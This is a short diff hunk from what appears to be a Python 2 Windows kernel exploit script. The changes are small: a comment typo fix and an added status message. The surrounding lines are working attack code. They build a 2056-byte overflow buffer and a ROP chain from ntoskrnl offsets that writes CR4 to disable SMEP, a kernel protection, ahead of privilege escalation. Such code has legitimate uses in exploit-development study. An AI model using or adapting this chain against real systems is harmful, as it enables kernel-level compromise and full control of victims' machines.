@@ -349,8 +349,10 @@ print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))
 # Offset to control execution
 input_buffer = "\x41" * 2056
 
-# SMEP says goodbyte
+# SMEP says goodbye
 # First ROP Gadget will go here
+print "Executing ROP chain. Goodbye SMEP..."
+
 input_buffer += struct.pack('<Q', kernel_address + 0x1475824)    # pop ecx; ret ; nt!HvlEndSystemInterrupt+0x1e
 input_buffer += struct.pack('<Q', 0x00000000000506f8)            # Intended CR4 value
 input_buffer += struct.pack('<Q', kernel_address + 0x4265221)    # mov cr4, rcx ; ret ; nt!KiEnableXSave+0x6a08
